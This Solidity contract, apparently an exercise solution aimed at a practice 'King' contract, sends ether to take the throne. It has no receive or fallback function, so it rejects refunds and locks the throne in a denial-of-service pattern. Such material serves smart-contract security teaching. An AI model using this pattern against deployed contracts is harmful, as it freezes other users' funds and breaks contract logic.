// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";
interface IKing {
    receive() external payable;
}
contract AttackingKing {
    address payable public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = payable(_contractAddress);
    }

    function hackContract() external {
        // Code me!
        (bool sent, bytes memory data) = contractAddress.call{value: 1000000000000000008}("");
        require(sent, "Failed to send Ether");
    }
}
